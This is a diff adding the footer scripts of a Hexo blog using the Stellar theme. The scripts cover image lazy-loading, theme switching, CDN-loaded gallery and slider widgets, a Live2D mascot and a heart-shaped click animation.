+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.md-text img:not([class]), .md-text .image img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Live2D Widget -->
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 - 爱心爆炸效果 -->
+<script>
+  (function() {
+    // 创建爱心元素
+    function createHeart(x, y) {
+      const heart = document.createElement('div');
+      heart.className = 'click-heart';
+      heart.innerHTML = '❤';
+      heart.style.cssText = `
+        position: fixed;
+        left: ${x - 10}px;
+        top: ${y - 10}px;
+        font-size: 20px;
+        pointer-events: none;
+        z-index: 9999;
+        animation: heartFloat 1s ease-out forwards;
+        color: ${getRandomColor()};
+      `;
+      document.body.appendChild(heart);
+      
+      setTimeout(() => {
+        heart.remove();
+      }, 1000);
+    }
+    
+    // 随机颜色
+    function getRandomColor() {
+      const colors = [
+        '#ff6b6b', '#ff8e8e', '#ffa8a8',
+        '#ff69b4', '#ff1493', '#db7093',
+        '#ff4500', '#ff6347', '#ff7f50',
+        '#ffd700', '#ffec8b', '#ffa500'
+      ];
+      return colors[Math.floor(Math.random() * colors.length)];
+    }
+    
+    // 点击事件
+    document.addEventListener('click', function(e) {
+      // 排除特定元素
+      if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) {
+        return;
+      }
+      
+      // 创建多个爱心
+      for (let i = 0; i < 3; i++) {
+        setTimeout(() => {
+          const offsetX = (Math.random() - 0.5) * 40;
+          const offsetY = (Math.random() - 0.5) * 40;
+          createHeart(e.clientX + offsetX, e.clientY + offsetY);
+        }, i * 100);
+      }
+    });
+  })();
+</script>
+
+<style>
+  @keyframes heartFloat {
+    0% {
+      opacity: 1;
+      transform: translateY(0) scale(1);
+    }
+    50% {
+      opacity: 0.8;
+      transform: translateY(-30px) scale(1.2);
+    }
+    100% {
+      opacity: 0;
+      transform: translateY(-60px) scale(0.8);
+    }
+  }
+</style></div></body></html>
